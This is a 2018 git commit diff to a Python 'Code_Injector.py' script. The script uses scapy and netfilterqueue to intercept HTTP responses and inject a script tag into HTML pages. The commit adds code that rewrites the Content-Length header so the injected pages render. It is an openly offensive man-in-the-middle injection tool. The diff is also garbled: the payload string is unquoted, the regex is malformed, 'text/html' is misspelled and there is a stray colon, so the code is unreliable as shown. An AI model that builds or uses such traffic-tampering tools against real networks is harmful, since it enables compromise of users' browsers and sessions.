29e204e83f24a67eecb7f8d0aa72229a9bb25fe7
Shane Calder <shanescottcalder@gmail.com>
2018-07-24 16:27:27 -0600

    Add files via upload
    adjusted for html page length

--- Code_Injector.py
+++ Code_Injector.py
@@ -22,12 +22,19 @@ def process_packet(packet):
 
         elif scapy_packet[scapy.TCP].sport == 80:
             print('[+] Response')
-            load = load.replace('</body>', '<script>alert('test')</script></body>',)
+            injection_code = <script>alert('test')</script>
+            load = load.replace('</body>', injection_code + '</body>',)
+            # looking for page length, then sperating length from search using regex ?: in front of group used to search
+            content_length_search = re.search(('?:Content-Length:\s)(\d*)', load)
+            if content_length_search and 'test/html' in load:
+                content_length = content_length_search.group(1)
+                new_content_length = int(content_length) + len(injection_code)
+                load = load.replace(content_length, str(new_content_length))
 
         if load != scapy_packet[scapy.Raw].load:
             new_packet = set_load(scapy_packet, load)
             packet.set_payload(str(new_packet))
-            
+
     packet.accept()
 
 queue = netfilterqueue.NetfilterQueue():
